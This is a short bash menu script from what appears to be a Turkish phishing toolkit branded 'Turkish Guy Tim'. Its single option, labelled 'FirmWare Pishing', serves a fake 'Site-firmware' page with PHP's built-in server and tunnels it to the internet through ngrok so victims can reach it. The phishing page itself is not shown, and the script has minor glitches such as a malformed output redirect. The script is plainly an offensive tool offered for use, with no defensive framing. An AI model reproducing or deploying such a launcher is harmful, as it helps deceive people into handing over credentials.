#!/bin/bash
#Turkish Guy Tim

r
clear
echo -e  "
\e[31m
  _____________________   __   __
 |__   __/ __ _|__   __|  \ \ / /
    | | | |  __   | |      \ V / 
    | | | | |_ |  | |       > <  \e[37m   Others \e[31m
    | | | |__| |  | |      / . \ 
    |_|  \_____|  |_|     /_/ \_\

    \e[32m=============================



\e[31m============================|
\e[31m|[01]\e[32m FirmWare Pishing      \e[31m|
\e[31m============================|


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[31m"
read -p "| Numara Seçiniz:" islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: firmware"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-firmware/
	php -S 127.0.0.1:$port > -t & ngrok http $port

elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash tgtx.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
echo -e "\e[31mTurkish Guy Tim İyi Günler Diler :)"
sleep 1
clear
exit 1
else
echo ""
echo -e "\e[31m Lütfen Girdiğiniz İşlem Numarasını Kontrol Edin...."
sleep 3
clear
bash Others.sh
fi